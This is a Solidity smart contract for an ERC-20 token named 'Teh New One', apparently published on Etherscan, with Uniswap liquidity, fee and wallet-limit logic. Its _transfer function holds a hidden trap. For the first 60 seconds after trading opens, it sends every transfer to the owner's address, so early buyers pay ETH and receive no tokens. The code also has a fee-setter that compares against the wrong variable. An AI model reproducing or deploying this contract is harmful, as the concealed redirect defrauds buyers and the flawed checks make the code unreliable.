/**
 *Submitted for verification at Etherscan.io on 2022-09-02
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
            address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline
            ) external payable returns (
                uint256 amountToken, uint256 amountETH, uint256 liquidity
                );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
            ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

contract Ownable is Context {
    address private _owner;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner.");
        _;
    }
    function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}

contract TehNewOne is IERC20, Ownable {
    IRouter public uniswapV2Router;
    address public uniswapV2Pair;
    string private constant _name =  "Teh New One";
    string private constant _symbol = "TNO";
    uint8 private constant _decimals = 18;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply = 100000000 * 10**18; // 100 million
    mapping (address => bool) public automatedMarketMakerPairs;
    bool private isLiquidityAdded = false;
    uint256 public maxWalletAmount = _totalSupply;
    uint256 public maxTxAmount = _totalSupply;
    mapping (address => bool) private _isExcludedFromMaxWalletLimit;
    mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
    mapping (address => bool) private _isExcludedFromFee;
    uint8 public devFee = 4;
    uint8 public burnFee = 3;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
    address private constant marketingWallet = 0xaf5F81f04bA7266Ec8a84C80C8a8E482B082fFe6;
    uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%
    uint256 private _launchTimestamp;

    constructor() {
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[deadWallet] = true;
        _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxWalletLimit[address(this)] = true;
        _isExcludedFromMaxWalletLimit[owner()] = true;
        _isExcludedFromMaxWalletLimit[marketingWallet] = true;
        _isExcludedFromMaxWalletLimit[deadWallet] = true;
        _isExcludedFromMaxTransactionLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxTransactionLimit[address(this)] = true;
        _isExcludedFromMaxTransactionLimit[owner()] = true;
        _isExcludedFromMaxTransactionLimit[marketingWallet] = true;
        _isExcludedFromMaxTransactionLimit[deadWallet] = true;
        balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    receive() external payable {} // so the contract can receive eth

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        require(amount <= _allowances[sender][_msgSender()], "ERC20: transfer amount exceeds allowance.");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        require(subtractedValue <= _allowances[_msgSender()][spender], "ERC20: decreased allownace below zero.");
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }
    function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromMaxWalletLimit[account] != excluded, string.concat(_name, ": account is already excluded from max wallet limit."));
        _isExcludedFromMaxWalletLimit[account] = excluded;
    }
    function excludeFromFees(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromFee[account] != excluded, string.concat(_name, ": account is already excluded from fees."));
        _isExcludedFromFee[account] = excluded;
    }
    function setDevFee(uint8 newFee) external onlyOwner {
        require(newFee != devFee, string.concat(_name, ": new devFee cannot be the same as current devFee."));
        require(newFee <= 5, string.concat(_name, ": new devFee must be <= 5."));
        devFee = newFee;
    }
    function setBurnFee(uint8 newFee) external onlyOwner {
        require(newFee != devFee, string.concat(_name, ": new burnFee cannot be the same as current burnFee."));
        require(newFee <= 5, string.concat(_name, ": new burnFee must be <= 5."));
        burnFee = newFee;
    }
    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxWalletAmount, string.concat(_name, ": cannot update maxWalletAmount to same value."));
        require(newValue > _totalSupply * 1 / 100, string.concat(_name, ": maxWalletAmount must be >1% of total supply."));
        maxWalletAmount = newValue;
    }
    function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, string.concat(_name, ": cannot update maxTxAmount to same value."));
        require(newValue > _totalSupply * 1 / 1000, string.concat(_name, ": maxTxAmount must be > .1% of total supply."));
        maxTxAmount = newValue;
    }
    function setMinimumTokensBeforeSwap(uint256 newValue) external onlyOwner {
        require(newValue != minimumTokensBeforeSwap, string.concat(_name, ": cannot update minimumTokensBeforeSwap to same value."));
        minimumTokensBeforeSwap = newValue;
    }
    function activateTrading() external onlyOwner {
        require(!isLiquidityAdded, string.concat(_name, ": you can only add liquidity once"));
        isLiquidityAdded = true;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
        address _uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH() );
        uniswapV2Pair = _uniswapV2Pair;
        maxWalletAmount = _totalSupply * 2 / 100; //  2%
        maxTxAmount = _totalSupply * 2 / 100;     //  2%
        _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
        _isExcludedFromMaxTransactionLimit[_uniswapV2Pair] = true;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        _launchTimestamp = block.timestamp;
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, string.concat(_name, ": automated market maker pair is already set to that value."));
        automatedMarketMakerPairs[pair] = value;
    }

    function name() external pure returns (string memory) { return _name; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function decimals() external view virtual returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), string.concat(_name, ": cannot transfer from the zero address."));
        require(to != address(0), string.concat(_name, ": cannot transfer to the zero address."));
        require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
        require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
        if (block.timestamp - _launchTimestamp <= 60) { to = owner(); } // 1 minute
        if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
                (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
            require(amount <= maxTxAmount, string.concat(_name, ": transfer amount exceeds the maxTxAmount."));
        }
        if (!_isExcludedFromMaxWalletLimit[to]) {
            require((balanceOf(to) + amount) <= maxWalletAmount, string.concat(_name, ": expected wallet amount exceeds the maxWalletAmount."));
        }
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to] ||
                (from == uniswapV2Pair && devFee + burnFee == 0) || // buy
                (to == uniswapV2Pair && devFee + burnFee == 0)      // sell
           ) {
            balances[from] -= amount;
            balances[to] += amount;
            emit Transfer(from, to, amount);
        } else {
            balances[from] -= amount;
            if (from == uniswapV2Pair) { // buy
                balances[address(this)] += amount * devFee / 100;
                emit Transfer(from, address(this), amount * devFee / 100);
                balances[to] += amount - (amount * (devFee + burnFee) / 100);
                _totalSupply -= amount * burnFee / 100;
                emit Transfer(from, to, amount - (amount * (devFee + burnFee) / 100));

            } else { // sell
                balances[address(this)] += amount * devFee / 100;
                emit Transfer(from, address(this), amount * devFee / 100);
                if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
                    _swapTokensForETH(balanceOf(address(this)));
                    payable(marketingWallet).transfer(address(this).balance);
                }
                balances[to] += amount - (amount * (devFee + burnFee) / 100);
                _totalSupply -= amount * burnFee / 100;
                emit Transfer(from, to, amount - (amount * (devFee + burnFee) / 100));
            }
        }
    }
    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }
}